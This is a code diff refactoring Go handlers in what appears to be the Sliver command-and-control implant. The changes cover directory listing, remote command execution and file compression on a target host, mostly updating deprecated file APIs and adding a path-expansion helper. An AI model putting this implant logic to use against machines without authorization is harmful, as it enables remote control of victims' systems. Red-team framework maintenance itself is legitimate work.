@@ -26,7 +26,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
+	"io/fs"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -37,6 +37,7 @@ import (
 	"log"
 	// {{end}}
 
+	"github.com/bishopfox/sliver/implant/sliver/handlers/matcher"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -173,11 +174,11 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	var match bool = false
 	var linkPath string = ""
 
-	for _, fileInfo := range files {
+	for _, dirEntry := range files {
 		if filter == "" {
 			match = true
 		} else {
-			match, err = filepath.Match(filter, fileInfo.Name())
+			match, err = matcher.Match(filter, dirEntry.Name())
 			if err != nil {
 				// Then this is a bad filter, and it will be a bad filter
 				// on every iteration of the loop, so we might as well break now
@@ -186,29 +187,32 @@ func dirListHandler(data []byte, resp RPCResponse) {
 		}
 
 		if match {
-			// Check if this is a symlink, and if so, add the path the link points to
-			if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
-				linkPath, err = filepath.EvalSymlinks(path + fileInfo.Name())
-				if err != nil {
-					linkPath = ""
-				}
-			} else {
-				linkPath = ""
-			}
-
-			dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
-				Name:  fileInfo.Name(),
-				IsDir: fileInfo.IsDir(),
-				Size:  fileInfo.Size(),
+			fileInfo, err := dirEntry.Info()
+			sliverFileInfo := &sliverpb.FileInfo{}
+			if err == nil {
+				sliverFileInfo.Size = fileInfo.Size()
+				sliverFileInfo.ModTime = fileInfo.ModTime().Unix()
 				/* Send the time back to the client / server as the number of seconds
 				since epoch.  This will decouple formatting the time to display from the
 				time itself.  We can change the format of the time displayed in the client
 				and not have to worry about having to update implants.
 				*/
-				ModTime: fileInfo.ModTime().Unix(),
-				Mode:    fileInfo.Mode().String(),
-				Link:    linkPath,
-			})
+				sliverFileInfo.Mode = fileInfo.Mode().String()
+				// Check if this is a symlink, and if so, add the path the link points to
+				if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
+					linkPath, err = filepath.EvalSymlinks(path + dirEntry.Name())
+					if err != nil {
+						linkPath = ""
+					}
+				} else {
+					linkPath = ""
+				}
+			}
+			sliverFileInfo.Name = dirEntry.Name()
+			sliverFileInfo.IsDir = dirEntry.IsDir()
+			sliverFileInfo.Link = linkPath
+
+			dirList.Files = append(dirList.Files, sliverFileInfo)
 		}
 	}
 
@@ -217,7 +221,7 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func getDirList(target string) (string, []os.FileInfo, error) {
+func getDirList(target string) (string, []fs.DirEntry, error) {
 	dir, err := filepath.Abs(target)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -226,10 +230,10 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 		return "", nil, err
 	}
 	if _, err := os.Stat(dir); !os.IsNotExist(err) {
-		files, err := ioutil.ReadDir(dir)
+		files, err := os.ReadDir(dir)
 		return dir, files, err
 	}
-	return dir, []os.FileInfo{}, errors.New("directory does not exist")
+	return dir, []fs.DirEntry{}, errors.New("directory does not exist")
 }
 
 func rmHandler(data []byte, resp RPCResponse) {
@@ -530,7 +534,16 @@ func executeHandler(data []byte, resp RPCResponse) {
 	}
 
 	execResp := &sliverpb.Execute{}
-	cmd := exec.Command(execReq.Path, execReq.Args...)
+	exePath, err := expandPath(execReq.Path)
+	if err != nil {
+		execResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%s", err),
+		}
+		proto.Marshal(execResp)
+		resp(data, err)
+		return
+	}
+	cmd := exec.Command(exePath, execReq.Args...)
 
 	if execReq.Output {
 		stdOutBuff := new(bytes.Buffer)
@@ -834,7 +847,7 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 		for _, fileName := range directoryFiles {
 			standardFileName := strings.ReplaceAll(testPath+fileName, "\\", "/")
 			if filter != "" {
-				match, err := filepath.Match(testPath+filter, standardFileName)
+				match, err := matcher.Match(testPath+filter, standardFileName)
 				if err == nil && match {
 					matchingFiles = append(matchingFiles, standardFileName)
 				}
@@ -848,7 +861,7 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 			if filter != "" {
 				// Normalize paths
 				testPath := strings.ReplaceAll(filepath.Dir(file), "\\", "/") + "/"
-				match, matchErr := filepath.Match(testPath+filter, filePath)
+				match, matchErr := matcher.Match(testPath+filter, filePath)
 				if !match || matchErr != nil {
 					// If there is an error, it is because the filter is bad, so it is not a match
 					return nil
@@ -928,4 +941,14 @@ func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, 
 		return readFiles, unreadableFiles, err
 	}
 	return readFiles, unreadableFiles, nil
+}
+
+func expandPath(exePath string) (string, error) {
+	if !strings.ContainsRune(exePath, os.PathSeparator) {
+		_, err := exec.LookPath(exePath)
+		if err != nil {
+			return filepath.Abs(exePath)
+		}
+	}
+	return exePath, nil
 }
